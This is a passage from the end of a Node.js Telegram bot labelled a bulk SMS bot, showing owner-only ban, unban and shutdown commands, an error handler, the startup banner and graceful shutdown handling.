        await addLog('OWNER_CMD', 'Invalid input for /ban', userId);
        await ctx.reply('❌ Invalid user ID.');
    }
});

bot.command('unban', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) {
        await addLog('UNAUTHORIZED', 'Unauthorized /unban attempt', userId);
        return ctx.reply('⛔ Unauthorized.');
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await addLog('OWNER_CMD', 'Incorrect usage of /unban', userId);
        return ctx.reply('Usage: /unban <user_id>');
    }
    
    try {
        const target = parseInt(args[1]);
        const success = await unbanUser(target);
        if (success) {
            await addLog('OWNER_CMD', `Unbanned user ${target}`, userId);
            await ctx.reply(`✅ User ${target} unbanned.`);
        } else {
            await addLog('OWNER_CMD', `User ${target} was not banned`, userId);
            await ctx.reply('❌ User was not banned.');
        }
    } catch {
        await addLog('OWNER_CMD', 'Invalid input for /unban', userId);
        await ctx.reply('❌ Invalid user ID.');
    }
});

bot.command('shutdown', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) {
        await addLog('UNAUTHORIZED', 'Unauthorized /shutdown attempt', userId);
        return ctx.reply('⛔ Unauthorized.');
    }
    
    await addLog('SYSTEM', 'Bot shutting down', userId);
    await ctx.reply('🛑 Bot is shutting down...');
    process.exit(0);
});

// ============================
// ERROR HANDLER
// ============================
bot.catch(async (err, ctx) => {
    console.error('Bot error:', err);
    await addLog('ERROR', `Bot error: ${err.message}`);
    if (ctx) {
        try {
            await ctx.reply('⚠️ An error occurred. Please try again.');
        } catch (replyErr) {
            console.error('Reply error:', replyErr);
        }
    }
});

// ============================
// START BOT
// ============================
bot.launch().then(() => {
    console.log(`
╔════════════════════════════════════════════════╗
║  🚀 BULK SMS BOT - NODE.JS DEPLOYMENT         ║
║  ✅ Database: ${DB_PATH}                       ║
║  ✅ HTTP Server: Port ${PORT}                  ║
║  ✅ Developer: @RTFGAMMING                     ║
║  ✅ Logging Channel: ${LOG_CHANNEL}            ║
║  ✅ Ready for Production!                      ║
╚════════════════════════════════════════════════╝
    `);
    addLog('SYSTEM', 'Bot started successfully');
}).catch(err => {
    console.error('Failed to start bot:', err);
});

// Graceful shutdown
process.once('SIGINT', () => {
    addLog('SYSTEM', 'Bot stopped (SIGINT)');
    bot.stop('SIGINT');
    db.close();
});
process.once('SIGTERM', () => {
    addLog('SYSTEM', 'Bot stopped (SIGTERM)');
    bot.stop('SIGTERM');
    db.close();
});

module.exports = bot;
